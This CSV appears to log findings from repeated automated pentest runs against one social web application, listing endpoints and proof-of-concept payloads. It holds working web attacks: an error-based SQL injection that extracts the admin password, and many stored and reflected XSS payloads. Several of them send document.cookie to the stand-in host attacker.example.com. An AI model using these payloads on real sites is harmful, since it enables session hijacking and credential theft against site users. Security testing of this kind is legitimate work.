run_id,endpoint,vulnerability,poc
20260902-2313-0004,`/settings` POST `bio`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
20260903-0634-0005,`POST /create_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
20260903-0634-0005,`POST /edit_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>&id=19`"
20260903-0634-0005,`POST /settings`,Stored XSS (bio),"`bio=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>` (multipart/form-data)"
20260903-0634-0005,`GET /users?search=`,Reflected XSS,"`/users?search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
20260903-0634-0005,`GET /friends?search=`,Reflected XSS,"`/friends?username=mr_robot&search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
20260903-0634-0005,`POST /request_friend`,Reflected XSS,"`username=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
20260903-0657-0006,`POST /create_post`,Stored XSS,"`<script>alert(1)</script>` reflected unescaped in `<p class=""card-text h5"">...</p>`"
20260903-0657-0006,`POST /edit_post`,Stored XSS,"`<script>alert(1)</script>` reflected unescaped in `<p class=""card-text h5"">...</p>`"
20260903-0657-0006,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected unescaped in `<h6>0 matches for ...</h6>`
20260903-0657-0006,`POST /request_friend`,Reflected XSS,"`<script>alert(1)</script>` reflected unescaped in `<div class=""flash mb-2 error"">@... does not exist</div>`"
20260903-0725-0007,`POST /create_post`,Stored XSS,"`content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
20260903-0725-0007,`POST /edit_post`,Stored XSS,"`id=19&content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
20260903-0725-0007,`POST /settings`,Stored XSS (name),"`name=<script>alert(1)</script>` → reflected as `<h4 class=""card-title""><script>alert(1)</script></h4>`"
20260903-0725-0007,`POST /settings`,Stored XSS (bio),"`bio=<script>alert(1)</script>` → reflected as `<p class=""card-text""><script>alert(1)</script></p>`"
20260903-0725-0007,`GET /users`,Reflected XSS,`search=<script>alert(1)</script>` → reflected as `<h6>0 matches for <script>alert(1)</script></h6>`
20260903-0725-0007,`POST /request_friend`,Reflected XSS,"`username=<script>alert(1)</script>` → reflected as `<div class=""flash mb-2 error"">@<script>alert(1)</script> does not exist</div>`"
20260903-0725-0007,`POST /settings`,Reflected XSS (photo_url),`photo_url=<script>alert(1)</script>` → reflected in flash error message (partially truncated by URL parser)
20260903-0800-0008,`POST /create_post` (content),Stored Cross-Site Scripting,"`<script>alert(1)</script>` stored and reflected unescaped in `<p class=""card-text h5"">`"
20260903-0800-0008,`GET /users?search=X` (search),Reflected Cross-Site Scripting,`<script>alert(1)</script>` reflected unescaped in `<h6>` element
20260903-0800-0008,`POST /request_friend` (username),Reflected Cross-Site Scripting,"`<script>alert(1)</script>` reflected unescaped in `<div class=""flash mb-2 error"">`"
20260903-0828-0009,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
20260903-0828-0009,`POST /create_post`,Stored XSS,`<script>alert(document.cookie)</script>` stored and reflected unescaped in post card body
20260903-0828-0009,`POST /edit_post`,Stored XSS,`<script>alert(document.cookie)</script>` stored and reflected unescaped in post card body
20260903-0828-0009,`POST /settings`,"Stored XSS (name, bio)",`<script>alert(document.cookie)</script>` stored in `name`/`bio` and reflected on profile page
20260903-0828-0009,`POST /request_friend`,Reflected XSS,`<script>alert(1)</script>` reflected in error message as `@<script>alert(1)</script> does not exist`
20260903-0942-0011,`/create_post` (POST),Stored XSS (content),`<script>alert(1)</script>`
20260903-0942-0011,`/edit_post` (POST),Stored XSS (content),`<img src=x onerror=alert(1)>`
20260903-0942-0011,`/settings` (POST),Stored XSS (name),`<script>alert(1)</script>`
20260903-0942-0011,`/settings` (POST),Stored XSS (bio),`<script>alert(1)</script>`
20260903-0942-0011,`/users?search=` (GET),Reflected XSS (search),`<script>alert(1)</script>`
20260903-0942-0011,`/request_friend` (POST),Reflected XSS (username),`<script>alert(1)</script>`
20260903-1022-0012,`POST /create_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
20260903-1022-0012,`POST /edit_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
20260903-1022-0012,`GET /users?search=`,Reflected XSS,"`""><script>document.location=""http://attacker.example.com/steal?c=""+document.cookie</script>`"
20260903-1022-0012,`POST /request_friend`,Reflected XSS,"`username=""><script>document.cookie</script>`"
20260903-1047-0013,`/users?search=`,Reflected Cross-Site Scripting,`<script>alert(1)</script>` — reflected unescaped in `<h6>` element
20260903-1047-0013,`/posts?search=`,Reflected Cross-Site Scripting,`<script>alert(1)</script>` — reflected unescaped in `<h6>` element
20260903-1121-0014,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
20260903-1121-0014,`GET /friends?username=admin&search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
20260903-1121-0014,`POST /create_post`,Stored XSS,"`<script>alert(1)</script>` stored and reflected in `<p class=""card-text h5""><script>alert(1)</script></p>`"
20260903-1121-0014,`POST /edit_post`,Stored XSS,"`<script>alert(1)</script>` stored and reflected in `<p class=""card-text h5""><script>alert(1)</script></p>`"
20260903-1121-0014,`POST /request_friend`,Reflected XSS,"`<script>alert(1)</script>` reflected in `<div class=""flash mb-2 error"">@<script>alert(1)</script> does not exist</div>`"
